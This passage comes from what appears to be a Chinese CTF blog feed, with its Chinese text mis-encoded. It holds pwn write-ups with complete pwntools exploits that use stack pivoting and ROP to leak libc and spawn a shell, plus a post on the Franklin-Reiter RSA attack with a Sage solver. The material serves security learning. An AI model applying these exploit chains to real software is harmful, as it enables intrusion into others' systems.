class="number">4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ˆè¿ç§»åˆ°bss</span></span><br><span class="line">p.recv()</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss-<span class="number">0x4</span>)+p32(leave_ret)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŒæ ·çš„æ“ä½œå†æ¥ä¸€æ¬¡å³å¯</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload = flat(system,<span class="number">0xdead</span>,bin_sh)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27305</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">main = <span class="number">0x08048513</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">bss = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret = <span class="number">0x08048408</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸ƒç½®ROPé“¾ï¼Œå‡†å¤‡æ³„æ¼libc</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload = flat(write_plt,main,<span class="number">1</span>,write_got,<span class="number">4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ˆè¿ç§»åˆ°bss</span></span><br><span class="line">p.recv()</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss-<span class="number">0x4</span>)+p32(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ³„æ¼libc</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="string">&quot;write address: &quot;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">base = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŒæ ·çš„æ“ä½œå†æ¥ä¸€æ¬¡å³å¯</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload = flat(system,<span class="number">0xdead</span>,bin_sh)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p32(bss-<span class="number">4</span>)+p32(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><ul><li>è¯¥é¢˜ç›®æ˜¯å¯ä»¥å¾€bssæ®µä¸Šé¢è¯»å…¥ä¸œè¥¿ï¼Œç„¶åæ ˆè¿ç§»æ‰§è¡Œå³å¯ï¼Œé‚£ä¸‡ä¸€å¤±å»äº†å¾€bssæ®µè¯»çš„æƒåŠ›å‘¢ï¼Ÿæ¯”å¦‚è¯´æ²¡æœ‰ç¬¬ä¸€ä¸ªreadï¼Œè¿˜å¯ä»¥å†™å—ï¼Ÿ</li><li>å…¶å®è¿˜æ˜¯å¯ä»¥çš„ï¼Œé€šè¿‡readçš„å‡½æ•°å®ç°ï¼Œçœ‹åˆ°ä¸‹ä¸€é¢˜</li></ul><h1 id="24ç¾ŠåŸæ¯pstack"><a href="#24ç¾ŠåŸæ¯pstack" class="headerlink" title="24ç¾ŠåŸæ¯pstack"></a>24ç¾ŠåŸæ¯pstack</h1><p>é™„ä»¶ä¸‹è½½åœ°å€ï¼š<br>é“¾æ¥ï¼š<a class="link" href="https://pan.baidu.com/s/1TNRnyduX8HTeAFWrAywdww?pwd=4sco">https://pan.baidu.com/s/1TNRnyduX8HTeAFWrAywdww?pwd=4sco <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>æå–ç ï¼š4sco </p><h2 id="é€šè¿‡readæ‹“å±•â€æ ˆç©ºé—´â€"><a href="#é€šè¿‡readæ‹“å±•â€æ ˆç©ºé—´â€" class="headerlink" title="é€šè¿‡readæ‹“å±•â€æ ˆç©ºé—´â€"></a><mark>é€šè¿‡readæ‹“å±•â€æ ˆç©ºé—´â€<mark></mark></mark></h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you grasp this little bit of overflow?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>ä»£ç å¾ˆç®€å•ï¼Œ64ä½ç¨‹åºï¼Œç›¸å½“äºä¸Šé¢˜å»æ‰äº†ç¬¬ä¸€ä¸ªreadï¼Œç„¶åå…¶ä½™éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¯ä»¥æº¢å‡ºä¸¤ä¸ªå­—é•¿ï¼Œæ‰“æ ˆè¿ç§»ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰æ ˆåœ°å€ï¼Œä¹Ÿæ²¡æœ‰æå‰å¾€bssæ®µå¸ƒç½®å¥½ROPé“¾ï¼Œé‚£å°±ä¸å¯ä»¥å†™äº†å—ï¼Ÿçœ‹åˆ°<code>readçš„æ±‡ç¼–</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241024005908445-1738682371058-3.bmp"></p><ul><li><mark>å…³é”®ç‚¹å°±åœ¨è¿™é‡Œ<mark></mark></mark></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fd -&gt; rdi -&gt; rax -&gt; [rbp+buf]</span><br></pre></td></tr></table></figure></div><ul><li>æˆ‘ä»¬çš„readæ˜¯å¾€rbp+bufçš„åœ°å€å†™å…¥0x40çš„æ•°æ®çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†rbpè¦†ç›–ä¸ºbss+0x30ï¼Œret_addræ”¹ä¸º<code>lea rax,[rbp+buf]</code>è¿™æ¡æŒ‡ä»¤çš„åœ°å€(å¯è®°ä½œ<code>m_read</code>)ï¼Œä¸å°±å¯ä»¥å®ç°å¾€bssæ®µä¸Šè¯»å…¥æ•°æ®ï¼Œå³æå‰å¸ƒç½®å¥½ROPé“¾å—ï¼Ÿï¼ï¼</li></ul><h2 id="è®²è§£"><a href="#è®²è§£" class="headerlink" title="è®²è§£"></a>è®²è§£</h2><ul><li>ç¬¬ä¸€æ­¥å…ˆç”¨m_readå¾€bssæ®µä¸Šé¢å†™å…¥ROPé“¾ï¼Œè¯¥ROPé“¾ç”¨äºæ³„éœ²libc</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Can you grasp this little bit of overflow?\n&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x30</span>) + p64(bss) + p64(m_read)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(bss,pop_rdi_ret,puts_got , puts_plt, m_read,<span class="number">0</span>)</span><br><span class="line">payload += p64(bss - <span class="number">0x30</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure></div><p>è¿™æ ·ç¨‹åºä¼šæ‰§è¡Œm_readï¼Œè¯»å…¥ä¸‹æ–¹çš„payload</p><p>ï¼ˆ1ï¼‰ç¬¬ä¸€ä¸ªpayloadå¯ä»¥çœ‹åˆ°,rbpè¦†ç›–ä¸ºbssï¼Œret_addrä¸ºm_read</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241024104747898.bmp"></p><p>(2)ç¬¬äºŒä¸ªpayloadæ˜¯åœ¨<code>m_read</code>å¼€å§‹å†™å…¥æ•°æ®ï¼Œæ³¨æ„çœ‹åˆ°rspè¿˜æ˜¯åœ¨æ ˆä¸Šé¢çš„ï¼Œè¯´æ˜ä½ è¿˜å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºç»§ç»­æ‰“æ ˆè¿ç§»,éœ€è¦æ³¨æ„ï¼Œæˆ‘ä»¬ä¸€æ¬¡æ ˆè¿ç§»è‚¯å®šæ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥è¦æ³¨æ„æ­¤æ—¶rbpä¸èƒ½æ˜¯ä¹‹å‰ä¸€æ®µæ ˆè¿ç§»ä¸€æ ·å¡«å……åƒåœ¾æ•°æ®ï¼Œè¦å¡«å……ä¸ºbssã€‚</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241024105020233.bmp"></p><ul><li>æ‰§è¡Œå®ŒROPé“¾ä¹‹åä¼šç»§ç»­æ‰§è¡Œ<code>m_read</code>ï¼Œæ­¤æ—¶çš„rbpåº”è¯¥æ˜¯å¤šå°‘å‘¢ï¼Ÿå°±æ˜¯ä½ ç»™çš„<code>bss</code></li></ul><p>æ­¤æ—¶ç›´æ¥å¸ƒç½®ROPé“¾get shellå³å¯</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x20</span>)</span><br><span class="line">payload += flat(pop_rdi_ret,bin_sh,system,m_read)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p>è§£é‡Šä¸€ä¸‹è¿™ä¸ªpayloadï¼Œçœ‹ä¸‹å›¾ï¼š</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241024125053652.bmp"></p><p>å†™å…¥æ•°æ®ä»<code>rbp-0x30</code>å³0x601810å†™å…¥ï¼Œä½†æ˜¯å•çº¯çš„ç›´æ¥å†™å…¥0x30çš„æ•°æ®ç„¶åâ€œæ ˆæº¢å‡ºâ€å†™system(â€˜&#x2F;bin&#x2F;shâ€™)çš„ROPé“¾èƒ½è¡Œå—ï¼Ÿå½“ç„¶æ˜¯ä¸è¡Œçš„ï¼Œä½ å†™äº†ä½†æ˜¯å¹¶ä¸ä¼šæ‰§è¡Œï¼Œè¿™é‡Œå°±è¦æ³¨æ„ä¸‹é¢çš„<code>call read</code>äº†</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call: push rip; jmp addr; ret</span><br></pre></td></tr></table></figure></div><p><mark>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼Œcallå®Œå‡½æ•°ä¹‹åï¼Œä¼šæ‰§è¡Œretï¼Œå³<code>pop rip</code>ï¼Œæ­¤æ—¶å°†rspæ”¹ä¸ºROPé“¾çš„å¼€å¤´å³å¯ï¼Œä½†æ˜¯æ³¨æ„ï¼Œ<code>call</code>ä¼šå…ˆ<code>push rip</code>ï¼Œä¼šå°†rspå¾€ä½åœ°å€ç§»åŠ¨ä¸€ä¸ªå­—é•¿ï¼Œå³æ­¤æ—¶çš„rspåº”è¯¥æ˜¯0x601830,æ‰€ä»¥å¡«å……0x20çš„åƒåœ¾æ•°æ®ï¼Œç„¶åå¸ƒç½®ROPé“¾å³å¯ã€‚æ‰§è¡Œå®Œsyscallå¦‚ä¸‹</mark></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241024131138527.bmp"></p><ul><li>å¯ä»¥æ³¨æ„åˆ°ä¸‹æ–¹æˆ‘ä»¬å·²ç»å¸ƒç½®å¥½äº†ROPé“¾ï¼Œç„¶åDISASMé¡µé¢å…ˆæ”¾è¿˜æœ‰ä¸€ä¸ªretï¼Œå³å¯ä»¥æ‰§è¡ŒROPé“¾ï¼Œä»è€Œget shellã€‚</li><li>å…¶å®ä¹Ÿå¯ä»¥å‘ç°ï¼Œæœ€åçš„m_readå¯æœ‰å¯æ— </li></ul><h2 id="å®Œæ•´EXP-1"><a href="#å®Œæ•´EXP-1" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal=<span class="string">&#x27;gnome-terminal&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">m_read = <span class="number">0x4006C4</span></span><br><span class="line">bss = elf.bss()+<span class="number">0x800</span>+<span class="number">0x30</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln = <span class="number">0x4006B1</span> </span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400773</span></span><br><span class="line">leave_ret = <span class="number">0x00000000004006db</span></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Can you grasp this little bit of overflow?\n&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x30</span>) + p64(bss) + p64(m_read)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(bss,pop_rdi_ret,puts_got , puts_plt, m_read,<span class="number">0</span>)</span><br><span class="line">payload += p64(bss - <span class="number">0x30</span>) + p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u64(p.recvn(<span class="number">6</span>)+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x20</span>)</span><br><span class="line">payload += flat(pop_rdi_ret,bin_sh,system)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><h1 id="è¿›é˜¶-2024NSSCTFç§‹å­£æ‹›æ–°-ä¸å¯åçŠ¶çš„ä¸œè¥¿"><a href="#è¿›é˜¶-2024NSSCTFç§‹å­£æ‹›æ–°-ä¸å¯åçŠ¶çš„ä¸œè¥¿" class="headerlink" title="è¿›é˜¶-2024NSSCTFç§‹å­£æ‹›æ–°(ä¸å¯åçŠ¶çš„ä¸œè¥¿)"></a>è¿›é˜¶-2024NSSCTFç§‹å­£æ‹›æ–°(ä¸å¯åçŠ¶çš„ä¸œè¥¿)</h1><p>é€šè¿‡ç™¾åº¦ç½‘ç›˜åˆ†äº«çš„æ–‡ä»¶ï¼šè™½ç„¶ä¸çŸ¥é“ä½ åœ¨æœŸå¾…ä»€ä¹ˆï¼Ÿ.7z<br>é“¾æ¥ï¼š<a class="link" href="https://pan.baidu.com/s/1WyFc6Zz3dGCvwNKcrfx31w?pwd=vdfs">https://pan.baidu.com/s/1WyFc6Zz3dGCvwNKcrfx31w?pwd=vdfs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>æå–ç ï¼švdfs </p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Franklin-Reiterç›¸å…³ä¿¡æ¯æ”»å‡»</title>
      <link href="/2024/10/22/Franklin-Reiter%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/22/Franklin-Reiter%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒ:<a class="link" href="https://blog.csdn.net/XiongSiqi_blog/article/details/130978226">è¿™ç¯‡æ–‡ç«  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>è£…å¥½sageï¼š<a class="link" href="https://mirrors.aliyun.com/sagemath/win/SageMath-9.3-Installer-v0.6.3.exe">ä¸‹è½½é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h1 id="Franklin-Reiterä»‹ç»"><a href="#Franklin-Reiterä»‹ç»" class="headerlink" title="Franklin-Reiterä»‹ç»"></a>Franklin-Reiterä»‹ç»</h1><p>è¯¥æ”»å‡»æ–¹æ³•åœ¨äºä¸¤ä¸ªæ˜æ–‡m1,m2ï¼Œè¿™ä¸¤ä¸ªæ˜æ–‡åˆ©ç”¨åŒä¸€ä¸ªeå’Œmï¼Œå¹¶ä¸”<code>m2å’Œm1é—´å…·æœ‰çº¿æ€§å…³ç³»</code>,ä¾‹å¦‚ï¼š</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m2 = a*m1 + b</span><br></pre></td></tr></table></figure></div><ul><li>å¹¶ä¸”ç»™å‡ºäº†c1,c2</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n)</span><br></pre></td></tr></table></figure></div><p><mark><code>çŸ¥é“c1,c2,a,b,nï¼Œé‚£ä¹ˆm1æ˜¯å¯è§£çš„</code><mark></mark></mark></p><p><font size="4"><mark>åŸç†<mark></mark></mark></font></p><p><img lazyload src="/images/loading.svg" data-src="/../4d9cb6a54246a9e8e4019ae9b6be66a8.png"></p><ul><li>å› æ­¤æœ€åçš„è§£çš„å½¢å¼å…¶å®æ˜¯X-Mçš„å½¢å¼çš„ï¼Œåˆ©ç”¨sageåº“ä¸­çš„Q.coefficients()[0]</li></ul><blockquote><p>Q.coefficients() â€”â€” æå–å¤šé¡¹å¼Qä¸­çš„ç³»æ•°ï¼Œå¹¶ä¸”æ˜¯å‡åºæ’åˆ—<br>ä¸¾ä¸ªæ —å­ï¼š<br>f &#x3D; x^3 + 2x^2 -3x + 4<br>f.coefficients()<br>è¿”å›åˆ—è¡¨[4,-3,2,1]</p><p>f &#x3D; x^3 + 2x^2 + 4<br>f.coefficients()<br>è¿”å›åˆ—è¡¨[4,2,1] # 0çœç•¥</p></blockquote><h1 id="æ¿å­"><a href="#æ¿å­" class="headerlink" title="æ¿å­"></a>æ¿å­</h1><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">N = getPrime(<span class="number">512</span>)*getPrime(<span class="number">512</span>)</span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, N)</span><br><span class="line"></span><br><span class="line">a = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">b = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">m2 = a * m1 + b</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(N, a, b, c1, c2, sep=<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure></div><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n = ...</span><br><span class="line">c1 = ...</span><br><span class="line">c2 = ...</span><br><span class="line">a = ...</span><br><span class="line">b = ...</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">franklinReiter</span>(<span class="params">n,e,c1,c2,a,b</span>):</span><br><span class="line">    R.&lt;X&gt; = Zmod(n)[]</span><br><span class="line">    f1 = X^e - c1</span><br><span class="line">    f2 = (X*a+ b)^e - c2</span><br><span class="line">    <span class="comment"># coefficient 0 = -m, which is what we wanted!</span></span><br><span class="line">    <span class="keyword">return</span> Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[<span class="number">0</span>]) <span class="comment"># ç³»æ•°</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># GCD is not implemented for rings over composite modulus in Sage</span></span><br><span class="line">  <span class="comment"># so we do our own implementation. Its the exact same as standard GCD, but with</span></span><br><span class="line">  <span class="comment"># the polynomials monic representation</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compositeModulusGCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> a.monic()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> compositeModulusGCD(b, a % b)</span><br><span class="line"></span><br><span class="line">m=franklinReiter(n,e,c1,c2,a,b)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure></div><h1 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><h2 id="NSSCTF"><a href="#NSSCTF" class="headerlink" title="NSSCTF"></a>NSSCTF</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flag1=<span class="string">b&#x27;******&#x27;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">m1 = bytes_to_long(flag1)</span><br><span class="line">a = getPrime(<span class="number">128</span>)</span><br><span class="line">b = getPrime(<span class="number">128</span>)</span><br><span class="line">m2 = a*m1 + b</span><br><span class="line"></span><br><span class="line">hint1 = a**<span class="number">2</span> + a*b </span><br><span class="line">hint2 = b**<span class="number">2</span> + b*a</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;hint1 = <span class="subst">&#123;hint1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;hint2 = <span class="subst">&#123;hint2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1 = <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c2 = <span class="subst">&#123;c2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span 